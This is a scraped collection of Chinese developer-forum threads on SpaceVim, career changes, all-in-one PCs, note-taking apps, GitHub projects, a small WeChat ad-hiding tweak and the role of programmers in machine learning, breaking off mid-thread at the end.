{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/SpaceVim/SpaceVim/releases/tag/0.1.0\" rel=\"nofollow\">https://github.com/SpaceVim/SpaceVim/releases/tag/0.1.0</a></p>\n<p>SpaceVim 项目受 spacemacs 启发，采用模块化管理 vim 配置，目前支持以下语言开发，包括代码补全，语法检查，等等功能，欢迎尝试。</p>\n<p>已支持语言：</p>\n<ol>\n<li>c family</li>\n<li>java</li>\n<li>php</li>\n<li>js</li>\n<li>rust</li>\n<li>go</li>\n<li>lua</li>\n<li>perl</li>\n<li>viml</li>\n<li>python</li>\n</ol>\n<p>如果需要其他语言支持，欢迎前往 github 的 issue 提交，我灰尽快增加支持。</p>\n</div></div>"], "reply": "5", "tittle": "SpaceVim release 0.1.0 版本， 欢迎尝试，目前支持多种语言开发。", "comment": ["支持", "我其实一直不太明白， 受 spacemacs 启发 的意思是，在 vim 上引入了很多 emacs 的特点吗？\r", "\r", "我个人觉得， emacs 平台比 vim 更强大，但是 vim 的编辑方式更好，所以 spacemacs 把二者合起来我比较能理解。 SpaceVim 的哲学是怎样的呢？", " neovim 平台更强大！！", " SpaceVim 的初衷就是搭建一个好的平台，然后不同语言开发者设计自己语言相关的模块，然后这些模块可以被大众复用， 我觉得这才是 spacevim 项目的真正意义，这就是所谓的一劳永逸，一旦模块配置好，需要用这样的模块的用户，再也不需要为折腾插件，修复配置 bug 烦恼。", "赞"]},
{"content": "", "reply": "5", "tittle": "拜年啦，祝 V 友们新的一年万事如意，步步高升！", "comment": ["好像有个对联，适合送给大家\r", "Python Java C++ Line Line So Easy\r", "Year Month Week Day Day No Bug\r", "Happy New Year\r", "\r", "不要问我为什么是 Python Java C++ 这三个，我只是搬运工", "新年快乐", "66666", "新年快乐", "新年快乐"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有没有以前做技术的然后彻底转行的，或者从理工转向人文行业的同学来谈谈感受？</p>\n</div></div>"], "reply": "97", "tittle": "如果不让你做程序员，你会不会有种 [世界之大，却没有容身之地] 的感觉", "comment": ["我的话大概……还可以做产品经理吧。\r", "之前经常看产品经理不顺眼，自己当了产品后未必是个靠谱的产品，至少不会提那些刚张嘴就被开发打脸的需求。", "一个大学同学现在玩音乐，给乐队，电视节目做混音\r", "绝对不是技术不行去玩音乐的那种\r", "而是真心喜欢音乐\r", "说白了\r", "想想自己离开了机器还能做什么\r", "要是没有\r", "还是别想太多了", "那我就去当老师咯", "大学同学有相当多的都去考教师了。话说我自己的话离开了计算机估计真的没什么能干的了，其实高中的时候我的文科比理科好的多，一度打算报文科学经济或者法律的，不过父母认为理科容易找工作就报了理科。", "当个医生或者律师", "程序员只是个很小的群体 还是不要把自己困在这个小世界里的好", "如果这样，有机会我会去当老师吧", "我还可以去酒吧唱歌。。", "我从小学就在小霸王上写代码了，初中文曲星，然后电脑……\r", "\r", "也没想过没电脑了会怎样……", "男中音歌唱家", "学地质的，零基础转行写代码", "可以用学技术的思维再学一门其他技能", "可能会去搞数学", "《中国式相亲》金星主持的，有一集来了个厨师，自称换了 13 个工作，还写了一本如何谈恋爱的书，说自己现在正在自学编程，准备当程序员。", "前几年不是还有很多新闻说某大公司程序员回家创业 开水果店之类的 现在不流行了？", "程序员的下限是就是产品经理。\r", "如果连产品经理都无法快速上手，那么这个程序员的上限也只会低得可怜。相信在座的各位这点能力还是有的。", "可能是产品被黑的最惨的一次，不过也对，技术转产品门槛不高，我就是", "我还可以搬砖啊(难道现在不是吗", "如果不做程序员 我大概可以去\r", "读个历史方面的研 这是仅此写代码的爱好\r", "做产品经理 因为我当初做程序员就是因为好多想法没人帮我实现 就自己亲自上阵了\r", "搞大棚养殖之类的 这个是因为想搞自动化农业\r", "开个大排档", "那我只能滚回电脑城帮人修电脑了", "修电脑 + 1", "那只能抄起锄头去种地了。诶，等会儿，我腰闪了……", "艺术家或者设计师", "妈蛋 不当程序员要是不找个有钱的工作 老婆都跟别人跑了", "干点啥不行，实在不行还可以当老板娘啊", "那我只能考个公务员当了.", "那我只能去搬砖了🤣", "想去开卡车给人送货", "我想去学厨师，哈哈", "不会，刚程序员这么多年，对我来说最大的收获不是学会编程，而是学会了方法论，然后慢慢延伸出自己的思维方式和处事准则，说的简单点，就是如何用脑子。以这个为前提，我不认为不做程序员会咋样，当然我喜欢编程，即使不当工作，也不会放弃。", "\"程序员的下限是就是产品经理。\"\r", "这是产品经理被黑的最惨的一次，心疼这哥们这些年碰到的都是些啥产品经理，如此不入他眼。或者他对产品经理的理解只是理理需求写写文档吹吹逼...", "有，我是学纯文科会计的，法律方向，据说是 ACCA 免考 9 门，但是毕业去了嵌入式通讯设备公司做研发， ios 端，自学 Linux C 中。", "卖水果去了", "不做程序员了还可以做产品经理啊。", "可以学一学 ui 设计之类的，或者做个老师，现在培训机构里面据说老师工资也很高。哦对了，还有开淘宝店，或者去图书馆做个图书管理员也不错。自学音乐也可以。", "我感兴趣的事情还是挺多，可惜一个人的时间和精力也就那么多", "看了 LZ 的标题只想说 感谢发明计算机的人们。如果没有你们，世界辣么大 却没有安身立命的能力。", "我可以贴膜", " 功夫？", "如果许嵩看到这个帖子 ... 那么下面的回复肯定是这样的：\r", "\r", "```\r", "当不了程序员我还可以做歌手，\r", "做不了歌手我还可以做个医生，\r", "医生也懒得做了，做个厨师吧，\r", "厨师没意思，还是做摄影师吧。\r", "```", " 说出你的故事，测量的准备转行啊", "我一直觉得我当产品经理能把对手摁在地上打", "只能去做吉他手，或者在琴行教人弹吉他了", "一年前我一直以为自己会成为后期狗", "“ 你們看那天上的飛鳥，也不種也不收，也不積蓄在倉裡，你們的天父尚且養活牠，你們不比飛鳥貴重得多嗎？ ”\r", "\r", "不会啊，我反而会觉得世界很大！", " 马太福音", "可以去当英语 /数学 /计算机老师。", "想去做老师 或者 开个咖啡店", "摆地摊，我觉得挺不错的", " 吹牛逼，我也会。", " 所谓双拳难敌四手，好汉架不住人多，两个一起上就不一定谁在地上了，三个一起上，就可以确定谁在地上了。", "额。。。一直想做厨子来着", "开网店，忽悠人", "路边摊手机贴膜", "卖早餐呀", "还可以做咨询嘛~", "咨询和培训的话，中高端的还是挺不错的，参考健身舞蹈乐器的高级私教，一节课收费挺高的", "虽然是日常收金币\r", "但会去开个青旅 然后说不定天天骑车了", "公务员……然后打代码休闲……", "可以去做个教授", "会有点。。。。。。。哈哈哈哈哈", "不会，只会觉得了无生趣……", "卖杂粮煎饼，真是好吃", "那我就打算卖水果，一边卖一边吃", " 毕业后第一份工作是在工地当技术员，一段时间后受够了不喜欢的工作，思考以后的出路，发现对编程感兴趣。深思熟虑之后，裸辞去培训机构花几个月入门，然后快速找到一个 java 的工作，在工作的这几年中，不断拓展自己的知识面和技能，目前职位不算低，也找到了自己的定位，很早之前转战前端，现在专职前端开发。", "这段转行经历给我的最大感受是：", "1.一定要找一个自己喜欢的工作；", "2.找到之后，认真的做，要提高自己的自学能力；", "3.多联系，勤思考；", "4.当技术到了一定程度之后，会有两个选择，继续做技术或转管理岗位，这个看自己。", "ps.另外，再说下楼主的问题。如果不做程序员，会练好吉他，也许会进军歌坛吧（唱歌还行），当个歌手🎸😬", "电力专业的码农，虽然电工证已经过期了", " naive,除非自己办个图书馆，很难，公共馆属于事业单位，需要考试，大的省馆或者大城市市馆都是万里挑一。高校现在更是难，特别是好的高校，上次听说一个北大博士去应聘被刷了。。。图书馆确实好单位，有编制的收入不低，但是压力小，过的真是生活。", "没了电脑,我就去做业务了...", "我可能会按照兴趣去研究天文 /地理 /考古", "以我一开始进入这一行之前的经历来看 我只有去电脑城装机去了 毕竟鼓捣 PC 机长大的 从家里的 386 到 AMD 三核处理器时代我都一直在弄 进入这一行反而没这么折腾了 都是买的笔记本 再也没攒过机", "我大概会去考一个教师资格证，然后当个小学老师", "在家种田，饿不死然而估计找不到老婆", "辅导 高中 /初中 物理 /化学 /生物等", "我可能开一个淘宝店 ", " ", "现在马上去做也肯定没问题的职业：\r", "- 产品经理\r", "- 项目经理\r", "\r", "现在开始花三年时间进行练习后应该可以胜任的职业：\r", "- 攥稿人\r", "\r", "还是眼界太窄，不应该只有这么三个的。", "当个土豪", "牛逼的人 你让他转行 哪怕开个小超市 他也会比一般人经营得好！\r", "所以 不做什么都没问题", "还好，我不是程序员，我只是一个段子手销售。", "不会啊~", " 搞不懂我国国情。反正我是觉得图书馆管理员这种职位根本不需要什么专业技能啊，拉进来培训几天让他知道 isbn 编号，知道图书分类，教他用个内部的书籍管理系统就好了。那些招博士生硕士生进去过养老一般的工作生活的真是浪费社会人才啊。", "时尚博主，旅游撰稿人／策划，混音师，摄影师，烧烤店老板，吉他老师， Skater Pro ，外贸商人，微博舌战群儒的公知，培训班老板，或者做一辈子学生", "如果不让我坐程序员，我能干啥？\r", "\r", "查看了一下自己的技能树\r", "我会开火车，我会开飞机，我会卖服务，我会做媒体，我会炒股票，我会炒外汇，我会编段子，我会炒菜，我懂各种行业的业务流，我会做设计，我特么还会做外科小手术，我会摄影，我会处理人际关系，我懂财务，我懂税务，我还精通各种刑法上教导我们的挣钱方法……", "有两个以前的同事从开发转型到 HR 去了。\r", "\r", "内心深以为可惜……\r", "\r", "但毕竟是自己的选择，而且转 HR 后能有更多的时候陪伴家人。", " 向大佬低头并请求传授经验", " 我也有这打算……真想换个工种了", " 哈哈， naive, 你说的那是图书馆中的 clerk （职员）, 而不是 librarian ，图书馆员是一种职业化程度很高的职业，当然这是在国外，现在国内大城市也很好。真是理想的职业啊，摔", " 谢谢你的回答、我也是在我们家一个国企上班。感觉没什么前途。本来上大学时就想学编程的。可是那会爸妈不让非要让学测量，说是毕业好找工作（因为家里有亲戚在这方面有关系）。工作一段时间也是受不了了，经济独立了跟爸妈也商量好了准备不干去学编程。再次感谢你", " 不客气。", "转行这个事，确实是要慎重考虑的，毕竟决定着以后很长一段时间甚至是一辈子的生活和工作。而且，转行的代价也是随着工作时间的增长而增大的，要是真决定转行，就要趁早，拖的时间越久，转行的压力就会越大。祝你好运。", " 无知者无畏啊，知道图书情报学这个专业有博士学位吗？又比如武大的信息系统专业对口的就是图书馆领域，文献查询编目，机读目录等等工作都很系统知识组成，各专业领域的文献查询，参考咨询可不是百度知道水平就够了", "然而我不是程序员，也不后悔现在的工作\r", "不过如果不干现在这个，我肯定去当程序员", "我在的民办学校和我同一批进的绝大部分是研究生／海外研究生，作为参考", "或许可以去搞传销", "应该会去做现实意义上的 工程师 吧\r", "或者去做翻译", " 每天上班感觉就是在挣扎中度过，很难受。觉得这不是自己想要的生活，这才决定转行的，毕竟编程是自己想要做的事情", "屠龙之术？", "可以去做摄影师 可以去做室内设计", " 我就是在电脑城氪金的人民币玩家啊。"]},
{"content": ["<div class=\"topic_content\">除了 iMac 之外</div>", "<div class=\"topic_content\">普通用户，正常上网，看视频， office ，基本上不玩游戏。</div>"], "reply": "55", "tittle": "一体机有什么推荐的吗？", "comment": ["放心，有 Surface Studio", "同楼上， Surface Studio", "Surface Studio\r", "\r", "给设计师用的", "这个中国还没的卖吧", "IMac", "微软 MVA 视频里面那种一体机是什么型号", " Surface studio 是给设计师用的吧，求推荐普通用户的", "Asus Zen AIO?", "Dell 家旗舰产品 XPS 一体机能做那么丑 妥妥 iMac", "反正都是 windows ，只是 lz 一楼这些需求的话，上淘宝买个 hdmi 的电脑棒就可以了，几百块钱的事情，往电视后面一插就可以用了。", "建议楼主说一下预算，还有加不加钱……这里很多加钱的建议的。", " 那玩意弄 office 的酸爽我是不会告诉你多难忘的。。。。。。现在 office 照样是很耗资源的，尤其是硬盘读写和内存占用", "15 年底给丈母娘买了台 HP 的一体机， 4500 的样子。买回来我自己给换成了 8G 内存。\r", "\r", "看剧、 QQ 、 QQ 农场偷菜、网页", "iMac 27 5K", "nuc 挂显示器吧", "LZ 说预算啊，不说预算怎么推荐", "![英特尔® NUC 套件 NUC6i7KYK 配备第六代智能英特尔® 酷睿™ i7 处理器和英特尔® 锐炬™ Pro 显卡，为玩激烈的游戏释放最大性能。我们新创建了一个别出心裁的外观，加上重新设计的机箱，让您能充分利用四核处理器的每一个 Ghz ，而毫无过热之虞 — 使 NUC6i7KYK 始终淡定不升温，酷。]( ", ")", "dell vostro 系列，便宜，换个 ssd 够用", "华擎 Deskmini STX 加显示器", "楼主 ms 的吧，微软内部购有优惠么？ Surface Studio", "Surface Studio", "飞利浦（ PHILIPS ） A222C3WHW 21.5 英寸一体机电脑（酷睿 i3-4030U 4GB 500GB DOS WiFi)16:9 全高清 显示屏\r", "一般来讲不说预算的话...嗯\r", "Surface Studio [二哈]", "xps one ，给你推荐一发", "wokao 楼上有  QQ 农场偷菜。。。。。。。。", "Surface Studio 只要愿花钱", " 公司内部优惠大部分时间敌不过京东，绝大部分时间敌不过天猫，绝对敌不过淘宝", " 现在还有 qq 农场！。。", " 表震惊。。", "华强北有你需要的！", "Dell 有一体机。\r", "但价格好像逼近 iMac 。", "买个 Mac mini 绑在显示器上（逃", "Surface 太贵了。。。。", "迷你 pc\r", "- nuc\r", "- asrock deskmini\r", "- dell 7040\r", "- thinkcentre m900 tiny", "Windows 的 Surface Studio ；\r", "Mac 的 iMac 。\r", "\r", "反正我是設計師，我用 iMac 5k ~", "NUC+显示器不是蛮好的嘛，各司其职的硬件才是好硬件", " 你这么回复对得起你的 ID 嘛（斜眼", "迷你 pc 显示器", "  CC 大人？", "树莓派插显示器上", "一体机都很垃圾，还不如上神船笔记本呢。", "推荐 Surface Studio 的是都亲身试过么？还是忘记了 SP 和 SB 刚出来时候的品控地狱？", "联想（ Lenovo ） IdeaCentre C560 23 英寸一体机电脑（ i5-4460T 8G 1T 2G 独显 Rambo 刻录 Wifi Win10 ）黑色", " 我不会告诉你有次我在 500 块钱的 Intel Z3735F+2G 内存的寨板上跑过 Vmware 虚拟 Unbuntu ，然后交叉编译过 openwrt 的固件，编译工具链+固件一共用了 1 个晚上。那个酸爽绝对超过你用 office ， but 还是可以编译成功的。", "前一段时间疯狂想买 dell 7040m", "比 nuc 感觉好的是省了内存， ssd", "而且也小巧", " 對的哦。", "  +1", "看看这个\r", "\r", "基于产品定位，市面上的一体机性价比都很低，除了少数几个高端产品之外，整体质量都很糟糕，建议买个 NUC 之类的挂在显示器后面，大多数小主机（譬如占美）都带 VESA 挂孔可以直接安装在显示器后，跟一体机没啥区别。", "个人不建议 Surface Studio ，毕竟微软出品的硬件……初代基本都是坑。一体机的话目前还是 iMac 整体素质比较靠谱，不过个人觉得一体机是个很尴尬的存在，除了漂亮似乎也没啥了 QAQ ，家里还是台式机好一些。", "骷髅峡谷绑 DELL U2515", " 不理解为什么比 NUC 好的是省了内存和 SSD", " 对于有整洁强迫症的人来说很有吸引力啊", "NUC+显示器 真的棒！", " \r", "\r", "intel 家的是没有自带 ssd, 内存的. \r", "dell 家的是自带的. 坏了的话, 找一家售后, 而不是多家.\r", "\r", "而且听到一个比较鸡贼的说法是, 类似如某些组装机(x 东上的雷霆之类, 有些不带内存), 要证明其到手就有问题, 还得先证明你自己提供的内存没有问题."]},
{"content": ["<div class=\"topic_content\">开发者可以访问这个网页获得相关信息：\r<br><a target=\"_blank\" href=\"https://developer.android.google.cn/topic/instant-apps/index.html?hl=zh-cn\" rel=\"nofollow\">https://developer.android.google.cn/topic/instant-apps/index.html?hl=zh-cn</a></div>"], "reply": "目前尚无回", "tittle": "Android Instant Apps 正式上线", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前六个里面三个是 JS 为主的。</p>\n<p>感觉主要还是因为写的 php 都是一些工作的项目。不过确实感觉自己在 PHP 的开源上做的有点少，今年要加油了。搞出个 PHP 的项目。</p>\n<p>近来都进来了，不妨来给个 star 吧，说不定有你喜欢的~</p>\n<p><a href=\"https://github.com/bestony\" rel=\"nofollow\">https://github.com/bestony</a></p>\n</div></div>", "<div class=\"topic_content\">错字 更正：\r<br>\r<br>进来都进来了，不妨来给个 star 吧，说不定有你喜欢的~\r<br>\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/bestony\" rel=\"nofollow\">https://github.com/bestony</a></div>"], "reply": "28", "tittle": "作为一个 PHPer,我的 github 上 Star 最多的 6 个项目没有一个是 PHP 的", "comment": ["我也是啊，写 python 的， gayhub 基本没什么项目是 python 的。这是最尴尬的", "快快  给楼主点 star ，这是主题的意义嘛", "  ", "   所以今年打算写个 PHP 的项目开源出来，总要有个 PHP 项目来壮(三声)脸\r", "\r", "  ", "   交 Star 不杀", "大部分 phper 还是离不开写 js", " 确实，写 php 的前端的三法宝多少都要写， JS 更是重中之重，要写 Ajax 之类的。", " 在我司我等 PHPer 只写接口，然后给文档给前端他们写 ajax 。难道这样不对？", " 对啊。但是小公司...一个 php 恨不得当产品、前端、后端、 QA 使....", "同楼主一样，主要写 PHP 但也要做前端 JS 和运维测试什么的，好处是真的帮公司节省了很多前后端交流成本，一些问题自己可以快速决定交给哪一端解决最方便", " 是的，很多时候和前端沟通不通，反而不如把代码写出来，丢给他看 233 。感觉特别爽。节省时间可以用于撸码。", "试试 swagger", "+65535 \r", "php 项目多得很但就是不人气，几天写个小东西自己顺手用用，各种缺星，宣传也没用\r", "\r", "随便发个前端 boilerplate ，基本没宣传 100 星\r", "\r", "github/mcfog 各位有空来逛逛哈，坑多得不行( ﾟ∀。)", "+1\r", "从没想过 Star 最多的竟然是 Shell 脚本。。。\r", "写 PHP 的轮子基本没星", " 感谢，等会造完轮子看看。\r", " 哈哈。同样的。所以想造个可以通用的项目。放出去。 PHP 除非做 sdk 、 composer 包之类的，确实很多人拿来没用。\r", "\r", " 哈哈，又一个被 php 耽误的运维大师", "前两年写了个 golang 的，一夜到 1K", " wide?", " 嗯，现在烂尾了..", " Go 这样的 IDE 还是本地化的方便些。我用 LiteIDE 。期待 GoLand~", " 我也用 LiteIDE 哈哈！关于 Wide 的产品定位请移步 ", " \r", "（我觉得我们这样强行歪楼会被打的）", " 哇，前排围观菊苣。前段时间翻了好久你的 gayhub", " 我以为是 githug 那种 git 的游戏，跑去谷歌一搜。。我的老天鹅。。这新世界的大门打开的猝不及防。。", "  ", "   不要乱 Google.会出事的。", " 欢迎来到新世界！", " 不会啊， python 还是很流行的，平时依赖的很多项目都是 python 写的\r", "\r", "1. bilidan ( ", "), B 站现在有了 H5 播放器，项目也停止维护了，但在以前的 flash 时代，我每天都用这个看 B 站\r", "2. biligrab ( ", "), 有些值得珍藏的高清 B 站视频，下载珍藏\r", "3. bypy ( ", "), bcloud ( ", "), iScript ( ", "), 3 个度娘盘下载客户端\r", "4. httpie ( ", "), curl 替代品\r", "5. you-get ( ", "), 万能视频下载\r", "6. musicbox ( ", "), 网易云音乐 CLI 客户端，我正想仿照这个做个度娘盘版的\r", "\r", "等等等等诸如此类，还有很多。\r", "\r", "我是个 Java ＋ Python ＋前端程序员， star 数最多的反而是一个 ruby 项目(项目主页 ", " github 上的项目后觉得我 ruby 不错，拜托，那是 homebrew 项目。。。", " 我是说我的情况。主要是很多项目都是半成品，够自己用，处于闭源状态。", "如果要开源，那做配置文件，处理，文档编写等等工作量太大了，忙不过来。", "php 涉及到业务比较多~~", " python 的很多啊。比如 ", " , 还有 ", ", 还有 ", ", shadowsocks 的 linux 端啊。 我当初就是逛 github 的时候，发现我大多数感兴趣的东西都是 python 做得，才学了 python", "支持 O(∩_∩)O", "作为 c 艹程序猿，我的倒有一个是 php 的。 wordpress 插件"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>眼不见为净。。</p>\n<p>%hook UIWebBrowserView</p>\n<ul>\n<li>(void)webView:(id)arg1 didFinishLoadForFrame:(id)arg2{\n%orig;\n[arg1 stringByEvaluatingJavaScriptFromString:@\"document.getElementById(\"js_bottom_ad_area\").style.display = 'none';\"];\nNSString *weburl= [arg1 stringByEvaluatingJavaScriptFromString:@\"document.URL\"];\n%log(weburl);\n}\n%end</li>\n</ul>\n</div></div>"], "reply": "4", "tittle": "看微信公众号文章时被广告 碍眼了。。。。。。所以。。。。。", "comment": ["能去掉不", "直接 hook 屏蔽了厉害", "如何使用", " 用 Theos 创建一个 WeChat 的模块，把这段代码帖进去编译就行了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><hr>\n<p>今年是大年初一,给大家拜年了!\n祝大家新年快乐,阖家欢乐.</p>\n<h1>吐槽仅供参考啊,一个强迫症的碎碎念,不要打我</h1>\n<p>leanote 感觉不错,就是坑太多了.\n安卓 none,自建的话倒是出了个成品,但是后续文档坑爹,太多坑的地方.\n看了论坛,有人发问题好久不回.</p>\n<hr>\n<p>Onenote 不支持 Markdown</p>\n<hr>\n<p>有道云笔记,网易匠心也一般吧.<br>\n看看手机的有道词典,就可以想象到导入导出广告什么的没长进了.</p>\n<hr>\n<p>还有许多朋友们推在 Mac 玩的笔记..买不起,转不起,用 Windows 今年 8 年了..</p>\n<hr>\n<p>想想为知,当初不用它是因为,嗯,markdown 预览不能自定义字体.</p>\n<hr>\n<p>看云,偶尔写代理什么的,看了用户协议..gone<br>\nGitBook 倒是不错,有空试试.</p>\n</div></div>"], "reply": "38", "tittle": "想想还是转 为知 + 印象了..", "comment": ["如果没有太高要求的话， simplenote .com 倒也算是轻量级的一个选择，跨平台，连 Linux 下都有。", "我就直接用的 iPhone 自带的备忘录。。\r", "学习笔记啥的还是直接放在博客和简书。。\r", "\r", "话说看云和 GitBook 为啥我用不来。。感觉好难用= =放弃了", " \r", "看云你需要会 git .. 本地有个差不多的编辑器..\r", "\r", "GitBook 官网下.. 因为全英文.. 我单词背的好慢", "直接用的印象，编辑糙点就糙点，满足自己的核心需求就 ok ，强迫症会发现根本没有什么完美的工具。", "leanote 自建，非常稳定，好用。奥，除了最后数据库表突然都没了。", "simplenote++ ", "iOS 与 android windows 版本都支持 markdown ，做笔记足够了，唯一不太满意的大概就是目录系统，需要自己有一定的标签系统来管理", " Git 还是会的。。但是实在觉得 UI 不好看。。\r", "GitBook 那个文件结构真是乱- -删了标签， md 文件还存在，反正我是凌乱的\r", "本来准备把之前总结的笔记弄成书，开源出去，但最后放弃了", " 瑕疵很多,我有强迫症.\r", "发现了就会不得安宁", "年轻真好，自从我上了一点年纪之后，强迫症都治愈了。", " \r", "是啊.. 不去在意忍着用就行,只要不是频次高的东西", " 谁叫你用 mongoDB 不设置管理员密码，这个事件上次出现了，有人批量删没设置密码的 mongoDB 数据库，然后勒索，这个锅你甩不给 leanote ，虽说我也是不用它，因为开始收费了，开源版本也不太好用，和官网版功能差很多", "有道云笔记 ", "没人用？", "安卓版本是有的，你上 github ，里面 leanote 的 releases 里有官网版，还有网友开发的第三方，这个比较好用，叫 leamonax ，也可以在 github 上找到", " 频次倒是挺高的，只是工具都是不完美的，往往都有优缺点。\r", "\r", "搞清楚自己的核心需求，然后选择自己最能接受的那个工具用就行了。 leanote 虽然支持 markdown ，但是在一些（我的）核心需求上（收集能力，搜索）方面反而没用。相比之下印象笔记是缺点最能接受的那个，忍一忍就好。", "以前用的 dokuwiki,有点像换掉了.\r", "每次编辑完得点一下才能看结果,蛋痛", "哈哈  你可以试试我的博客....  功能类似 CMS...... ", "最近在关注和使用这个新项目，很对口味。", "Standard Notes", "   ", "A standard notes app with an un-standard focus on longevity, portability, and privacy.", " 看一眼，就爱上你这博客的风格啦 赞一记！三级目录展开比 OneNote 那种更直接，适合阅读，赶紧想想办法丰富下内容，或者开放用户 UGC 。", "强迫症都是借口", " \r", "反正就是看着不顺眼,你懂我的意思.", " 用过几次,基本上都是用不了一天就会开始丢笔记,然后就弃用了", " 那个...   刚转行前端 还没入门呢...  自己快速丰富内容是不太可能啦..   \r", "过年还得找前端实习去 最近估计没空完善这个博客啦..    \r", "我也正愁内容呢. 非常感谢你的 UGC 建议哈.", "markdown 编辑器 （ mweb ）+ 同步云 （坚果云），定期移动硬盘备份", "wifi 你忘记封门了！\r", "被爆头的 jager 留", " if youdaoNote don't have  the two drawbacks that it is too closed to transfer the note to other place such as evernote and there are ads on the left bottom of its software,i will use it as my main force of noting my knowledge.", " \r", "From Google Translation\r", "NetEase is always free, but advertising and some restrictions are always inseparable from their software.\r", "网易虽然总是做免费,但是广告和一些限制总是离不开他们的软件.", " \r", "又是 mac .. 老哥我是 windows.\r", "谢谢你,新年快乐", " leanote 开源版本和官网版本具体有什么差别呢？", " \r", "自己会写的很多,这样确实可以,但是不方便管理.,.", "OneNote 的数字笔记珍宝插件支持 markdown ，要收费，大概一百多块，当前版本永久有效。", "翻来倒去我还是觉得 Evernote 好， Mac 有第三方客户端😂😂而且现在才懂印象笔记的设计思想。。。", "我用了一段时间 OneNote 之后，实在是受不了他那个该死的同步问题了。同步慢不说，动不动就要告诉我有损坏的分区。而且还不原生支持 markdown 。看了楼主的帖子之后直接转为知笔记了，顺带说一句， OneDrive 也转到坚果云了。\r", "\r", "准备先用完试用期，然后再转 VIP 。期间看看还有什么更好的解决方案。虽然为知笔记的浏览器截屏插件还有些问题，不过总体的体验是要比微软（硬不起来）好多了。", " \r", "设计思想? 说出来听听? :)滑稽\r", "\r", "\r", " \r", "你可以选择印象免费的用来剪辑,大多都支持,做个简单分类就好.  \r", "然后用 Markdown 写其他的.  \r", "我不打算用为知,一是不支持预览,而是不是很喜欢他的文件夹机制.反正 GitHub 空间无限,写完直接同步到我 GitHubPages 上去.", " 🤓i'm chinese,only i want to practice my English,hha.And i think you're right", " 开源版我自己搭建过，第一是容易出 bug ，经常性页面渲染不出来，出现错误提示代码在 html 上，第二开源版不能分享外链笔记给别人，还有一点是开源版没有绑定域名的功能，虽说这个可以用 nginx 实现，但是最坑的是他的博客地址是 xx.xx.xx.xx/blogname/而博文是 xx.xx.xx.xx/post/blogname/articlename,地址不一样，这就很坑了，导致用 nginx 做隐性跳转都变得不方便起来，因为地址格式不一样，并且博客是没有绝对路径给你去找的，都是靠 url 路由给你呈现，所以只能自己修改代码", " #33 \r", "你是说为知笔记不能边写边预览吗？其实是可以的，只要使用 Wiz.Editor.md 这个插件就可以了。可以在为知笔记的插件中心下载安装。 ", "\r", "另外我是非常喜欢文件夹机制的……不过为知笔记好像也支持 Tag ，我也没去试过。\r", "映像笔记的话，如果我实在是受不了为知笔记的这个截屏了，那就去用用吧，谢谢你的建议。", "话说 Google Keep 不就很轻便可靠吗？", "试遍所有主流笔记服务之后欢乐自带的 pages"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>机器学习的算法, 基本就那几大类, 都是根据各种教授研究员们的论文出来的,  各种库也有了, 我们非科研人员能做的就是利用现有的深度学习 /机器学习的库给的 API, 拿一批种子数据训练一下, 然后拿另一批数据验证, 调一下参数. 然后呢? 普通程序员 /架构师在这方面的价值在哪里?</p>\n<p>还请给专家指点.</p>\n</div></div>"], "reply": "47", "tittle": "机器学习现在很火, 但有个疑问: 这跟普通程序员有多大关系? 或者说我们的价值在哪里", "comment": ["你有听说一种职业 叫做 调参狗", "举个例子，几个月不写 c++，你会觉得自己什么都懂了，语法上没有什么需要继续学的。但是一旦回到天天写 c++的日子，就会时不时的有新收获，发现要学的还很多，这东西很难\r", "\r", "机器学习呢，现在还是很幼稚的阶段，理论欠缺甚多，远未成熟。实际做事也是，摸索着前进。", "这跟普通程序员没多大关系，但是培训班是绝对不会讲这些东西的，就算是调参要么靠直觉要么靠数学两个都不会你能干嘛\r", "一个训练程序多少个参数呢 都是阿尔法北塔伽马的\r", "这是核心竞争力\r", "对了 调参你以为很简单么？训练数据放多少合适？迭代次数多少合适？多了会不会过拟合？\r", "\r", "当然了，迫于经济压力，现在的机器学习算法都给竞价排名让步了", "调参方法都是商业秘密\r", "model 都差不多 看谁调参厉害", "机器学习是一个工具，在不同的场景需要搭建大量的 pipeline 才能使用。而大量现成的库和模型让一般程序员也能利用机器学习的成果。\r", "其次机器学习，数据远比模型重要，你其实并不需要一个 ML 博士，也有可能做得更好。即使你做不到最优的模型，一个最简单的概率模型也能带来 80%的提升。\r", "最后，机器学习不是魔法，它无法噗地一下就解决你的问题，启发式算法并不可耻。详见 rules of ml 我觉得写得很好。", "什么火做什么，乘机捞一笔走了，跟着资本走才有钱赚，只要不忘了技术的本质就好，或者能下定决心跳槽", "人的作用在于，思想创作。", " 深度神经网络理论早已提出，后来的 GPU 计算能力也证明其可行。现在各种接近梯度消失，训练过拟合的方法不断出现。图像的机器分离效果已经超过人类，再觉得不成熟就是保守了。", "广告推荐啊，滴滴打车最短路径选择啊。我就想的到这些东西了。\r", "\r", "还有比如知乎你一点进去很多乱七八糟的你不感兴趣，以后会有更好的 feed 流推荐？", "首先反驳“机器学习的算法就这么几种”这一观点。少年你得去看看 Graphical Models ，针对每一个实际问题要先建概率图模型，这一步就得兼顾可计算性和对问题的刻画能力。然后你找一种分布式算法去算吧， Parameter Servers 在向你招手。可以说每一个不同的数学模型建出来的 Graphical Model 就是一个不同算法，要是不同意，你就得承认 HMM 和 Logistic Regression 是同一种算法（都可以由 Graphical Model 刻画）。\r", "\r", "要能精确通过数学语言刻画一个实际问题，这就是功力。\r", "\r", "如果你不想用 Graphical Model 而投降“黑箱”算法——深度（神经网络）学习。呵呵，你真以为神经网络是完全黑箱吗？你明白 CNN 是针对数据的什么特性在工作吗？（ local receptive field + 平移不变性）应用到具体的问题上就更复杂了，比如两分类，我如果保证正例标注只会漏标不会错标，你如何修改标准的 loss function 以提升在这个具体问题上的性能？\r", "\r", "神经网络现在有很多零件，包括结构上比如 CNN, LSTM, Auto-Encoders ，启发式约束比如 L1/L2 正则化，各种 Sparsity Constraint ，训练方法比如 Nesterov Momumtum （一阶方法）， L-BFGS （二阶方法）。网络结构尚且不说，其他每一个超参都会影响到最终训练出来的模型。如何训练神经网络是一种艺术而非技术。", 